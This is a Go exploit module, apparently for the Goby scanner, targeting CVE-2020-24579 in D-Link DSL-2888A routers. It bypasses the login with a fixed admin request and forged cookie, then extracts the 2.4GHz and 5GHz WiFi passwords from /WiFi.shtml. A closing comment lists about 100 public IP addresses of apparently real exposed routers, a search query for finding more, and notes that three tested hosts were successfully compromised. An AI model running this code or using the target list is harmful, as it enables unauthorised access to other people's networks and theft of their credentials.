package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "D-Link DSL-28881A Unauthorized_access (CVE-2020-24579)",
    "Description": "The router's web portal's identity verification is insufficient to access any authenticated management pages without the need to enter the correct password. A malicious user on the same network can use invalid credentials to browse directly to any authenticated management page\nThis PoC may fail, try more times.",
    "Product": "D-Link DSL-28881A ",
    "Homepage": "http://www.dlink.com.cn/",
    "DisclosureDate": "2021-06-03",
    "Author": "yunying",
    "GobyQuery": "body=\"DSL-2888A\"",
    "Level": "1",
    "Impact": "<p>Attackers can access the management page without authorization</p>",
    "Recommendation": "",
    "References": [
        "http://wiki.peiqi.tech"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Wifi Name&&Password",
            "type": "Select",
            "value": "Show",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "Disclosure of Sensitive Information"
    ],
    "CVEIDs": [
        "CVE-2020-24579"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "D-Link Dir-645"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10209"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			var straaa = []rune("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
			rand.Seed(time.Now().Unix())
			b := rand.Intn(61)
			uid := "uid=y3TWG" + string(straaa[b]) + "Rt7z"
			uri := "/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Origin", u.FixedHostInfo)
			cfg.Header.Store("Referer", u.FixedHostInfo+"/page/login/login.html")
			cfg.Header.Store("Cookie", uid)
			cfg.Data = "username=admin&password=95fbeb8f769d2c0079d1d11348877da944aaefaba6ecf9f7f7dab6344ece8605"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 {
					uri2 := "/page/login/login.html?error=fail"
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Cookie", uid)
					httpclient.DoHttpRequest(u, cfg2)
					uri3 := "/WiFi.shtml"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.Header.Store("Cookie", uid)
					if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
						return resp3.StatusCode == 200 && strings.Contains(resp3.Utf8Html, "ConfigS[radios_num]")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var straaa = []rune("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")
			rand.Seed(time.Now().Unix())
			b := rand.Intn(61)
			uid := "uid=y3TWG" + string(straaa[b]) + "Rt7z"
			uri := "/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Header.Store("Origin", expResult.HostInfo.FixedHostInfo)
			cfg.Header.Store("Referer", expResult.HostInfo.FixedHostInfo+"/page/login/login.html")
			cfg.Header.Store("Cookie", uid)
			cfg.Data = "username=admin&password=95fbeb8f769d2c0079d1d11348877da944aaefaba6ecf9f7f7dab6344ece8605"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					uri2 := "/page/login/login.html?error=fail"
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Cookie", uid)
					httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
					uri3 := "/WiFi.shtml"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.Header.Store("Cookie", uid)
					if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
						if resp3.StatusCode == 200 && strings.Contains(resp3.Utf8Html, "ConfigS[radios_num]") {
							r1, _ := regexp.Compile("id=\"password_24\" (.*)onchange")
							r2, _ := regexp.Compile("id=\"password_5\" (.*)onchange")
							expResult.Output = "2.4GHz WifiPassword:" + (r1.FindStringSubmatch(resp3.Utf8Html))[1] + "\n" + "5GHz WifiPassword:" + (r2.FindStringSubmatch(resp3.Utf8Html))[1]
							expResult.Success = true
						}
					}
				}
			}

			return expResult
		},
	))
}

/*
fofa查询规则:body="DSL-2888A"
测试数据:
http://41.39.106.185:8080
https://59.101.175.4
http://91.140.140.173
http://103.14.174.230:8080
http://139.218.225.250
https://203.217.17.62:8080
http://41.39.228.42
http://89.203.9.36
http://60.241.91.150:8085
https://14.202.125.142
https://156.213.170.46:8080
https://105.99.203.223
http://14.137.83.84
http://124.180.41.118:8080
http://116.206.184.237
http://105.98.154.101
https://182.239.240.220:4444
http://120.146.190.69
http://60.50.66.83
https://123.243.91.46:8080
http://95.175.88.63:8080
http://102.47.9.113
http://94.29.183.99:8080
http://156.192.208.200
http://119.40.107.229
http://156.193.18.18
https://5.43.197.38
https://197.133.25.20:8080
http://202.169.217.93
http://102.190.126.251
http://196.221.206.88
http://156.192.209.144
http://41.39.189.88:8080
https://123.243.25.218
https://156.216.242.67
https://111.220.65.234
https://102.185.124.118
https://210.8.247.26
http://202.169.216.123
http://202.169.216.135
http://45.242.130.173
http://41.41.228.162
http://95.175.90.212:8080
https://45.240.132.95
https://122.111.138.46
http://41.237.103.19
http://27.33.195.245
http://82.178.142.197
https://120.146.190.69
http://178.61.134.87
https://156.204.193.101:8443
https://197.44.62.59
http://156.208.250.80
http://105.98.50.127
http://156.204.251.62
https://27.33.45.210:4433
http://122.148.241.239
https://110.174.41.210
https://59.167.120.195
http://207.136.5.164
http://196.74.171.44
http://175.138.162.171
http://203.174.137.174
http://218.215.224.209
http://203.219.12.78
http://156.193.129.21
https://59.154.7.70:8443
https://105.98.253.119
https://60.240.128.192:4433
http://105.96.8.227
http://156.192.167.53
https://180.148.99.235
https://59.154.7.38:8443
https://59.154.7.54:8443
https://175.38.241.172
http://115.129.131.172
https://115.188.142.56
http://41.41.0.86
http://94.183.111.140
http://41.32.254.160
https://49.188.95.189
http://185.82.34.161
https://125.168.45.52
http://180.148.99.235
http://124.254.117.62
http://124.254.117.22
https://115.42.19.39
http://122.109.177.171
http://45.247.134.60
http://58.164.89.24:8080
http://159.196.233.199:8080
http://218.214.206.123
https://220.244.140.218
https://49.190.215.193
http://85.154.202.83
https://41.129.103.51
http://45.247.208.77
https://122.109.177.171
https://105.99.18.102
http://178.61.134.30
测试样例与上一个提交的exp一样，短测5个结果也一样
成功率较高，测试了前五个，成功三个如下。
如果多次测试，会导致密码尝试过多次，然后限制5分钟，请5分钟后再次测试
http://91.140.140.173
http://139.218.225.250
http://103.14.174.230:8080
*/
